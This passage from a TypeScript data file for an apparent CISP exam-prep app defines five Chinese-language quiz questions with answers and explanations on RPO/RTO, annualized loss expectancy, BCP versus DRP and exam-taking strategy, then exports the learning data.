    quiz: [{id:`q${i}-1`,question:`${topic}中以下概念最容易混淆的是？`,options:['RPO和RTO','AES和DES','MD5和SHA','TCP和UDP'],correctIndex:0,explanation:'RPO=Recovery Point(丢多少),RTO=Recovery Time(等多久),考试高频混淆。'},{id:`q${i}-2`,question:'CISP考试中关于风险计算,ALE=？',options:['SLE×ARO','AV×EF','SLE÷ARO','SLE+ARO'],correctIndex:0,explanation:'年度预期损失=单次损失×年发生率。'},{id:`q${i}-3`,question:'以下哪种备考策略最有效？',options:['考前突击','错题回顾+概念辨析+模拟练习','只看书不练习','只做题不看书'],correctIndex:1,explanation:'错题重做+概念辨析+模拟题=最佳冲刺方式。'},{id:`q${i}-4`,question:'考试中选择题不确定时应？',options:['瞎蒙','先标记做后面的,排除法缩小选项','空着不答','随便选C'],correctIndex:1,explanation:'先标记跳过,后面回头用排除法,提高命中率。'},{id:`q${i}-5`,question:'BCP和DRP的关系是？',options:['BCP包含DRP','DRP包含BCP','两者完全相同','两者互不相关'],correctIndex:0,explanation:'BCP(业务连续性)范围大于DRP(灾难恢复)。'}],
    recommendedTools:weekToolMap[12]?.tools||[],labEnvironments:weekToolMap[12]?.labs||[],expertNotes:dayExpertNotes[i]||[],
  });
}

export const learningData: LearningDay[] = allDays;
export default learningData;
